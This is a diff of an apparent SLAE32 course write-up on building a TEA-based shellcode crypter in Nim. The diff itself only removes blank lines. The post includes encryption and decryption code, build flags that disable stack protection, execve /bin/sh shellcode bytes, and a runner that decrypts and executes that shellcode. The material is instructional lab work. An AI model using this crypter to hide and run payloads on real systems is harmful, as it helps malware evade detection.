@@ -63,7 +63,6 @@ void encrypt (uint32_t v[2], const uint32_t k[4])
     v[0] = v0;
     v[1] = v1;
 }
-
 ```
 
 As you can see, it is based on `XOR`, [Circular shifts](https://en.wikipedia.org/wiki/Circular_shift), and addition operations. All of them are repeated 32 times using a loop.
@@ -134,7 +133,6 @@ proc encrypt(v: array[2, uint32], k: array[4, uint32]): array[2, uint32] =
     #        bytes of encrypted data
     #
     return [v0, v1]
-
 ```
 
 As I mentioned in the comments, it's up to you to decide how to encode `8 bytes` of data into `2 unsigned 32-bit integer` values, or so it seemed (please contact me if I'm wrong).
@@ -192,7 +190,6 @@ proc encode(shellcode_buffer: array[4, byte]): uint32 =
         r += rotatedByte
 
     return r
-
 ```
 
 Hopefully the comments I've added to the code are enough.
@@ -222,7 +219,6 @@ nim c --hints:off --cpu:i386 -t:-m32 -l:-m32 -l:-fno-stack-protector -l:'-z exec
 #         Length: 24
 # [+] Saving encrypted shellcode to file: /tmp/encrypted.bin
 # [+] Decrypted shellcode: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128]
-
 ```
 
 <h4 id="decryption">Decryption
@@ -241,7 +237,6 @@ void decrypt (uint32_t* v, uint32_t* k) {
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
 }
-
 ```
 
 As before, the `Nim` code is very similar:
@@ -295,7 +290,6 @@ proc decrypt(v: array[2, uint32], k: array[4, uint32]): array[2, uint32] =
         sum -= delta
 
     return [v0, v1]
-
 ```
 
 The full source code can be found [here](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/7/decrypter.nim).
@@ -320,7 +314,6 @@ nim c --hints:off --cpu:i386 -t:-m32 -l:-m32 -l:-fno-stack-protector -l:'-z exec
 # [+] Output file: /tmp/decrypted.bin
 # [+] Decrypted bytes: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128]
 # [+] Writing decrypted shellcode to file: /tmp/decrypted.bin
-
 ```
 
 As you can see, the resulting shellcode, obtained from decrypting the encrypted shellcode, is identical the original one (unencrypted), meaning the program worked correctly.
@@ -363,14 +356,12 @@ proc main(): void =
     #       gef> b *fwrite
     echo "[+] Running shellcode"
     run_shellcode()
-
 ```
 
 To test this new piece of code, I've created a file named `shellcode.bin` containing the following shellcode (`execve` of `/bin/sh`):
 
 ```bash
 echo -ne "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80" > shellcode.bin
-
 ```
 
 If you were to compile the program `decrypter.nim` for 32-bit x86 systems, and execute it, it would spawn a `/bin/sh` shell, as shown below:
@@ -398,7 +389,6 @@ $ id
 # uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),113(bluetooth),118(scanner)
 $ exit
 rbct@debian11:~/slae32/assignment/7$
-
 ```
 
 As you can see, the program managed to decrypt the shellcode and run it, spawning a simple `/bin/sh` shell.
